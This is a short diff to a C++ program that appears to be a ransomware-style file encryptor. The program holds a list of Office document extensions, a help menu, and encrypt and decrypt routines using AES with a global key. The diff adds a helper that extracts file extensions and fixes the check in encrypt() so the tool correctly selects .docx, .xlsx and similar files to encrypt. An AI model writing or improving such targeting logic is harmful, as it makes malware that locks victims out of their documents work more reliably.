@@ -44,6 +44,14 @@ std::vector<std::string> extensions = {
     ".xlsx", ".xls", ".dotx", ".dotm", ".dot", ".docm", ".docb", ".docx", ".doc"
 };
 
+std::string cat_ext(const std::string& filepath) {
+    size_t pos = filepath.rfind(".");
+    if (pos == std::string::npos) {
+        return "isnotext";
+    }
+    return (filepath.substr(pos));
+}
+
 void display_help() {
     std::cout << "===>> Help Menu <<===" << std::endl;
     std::cout << "" << std::endl;
@@ -128,7 +136,7 @@ void decrypt(std::string filepath) {
 }
 
 void encrypt(std::string filepath) {
-    if (std::find(extensions.begin(), extensions.end(), filepath.substr(filepath.size() - 3)) == extensions.end())
+    if (std::find(extensions.begin(), extensions.end(), cat_ext(filepath)) == extensions.end())
         return;
     byte key[AES::DEFAULT_KEYLENGTH];
     std::memcpy(key, g_key.data(), AES::DEFAULT_KEYLENGTH);
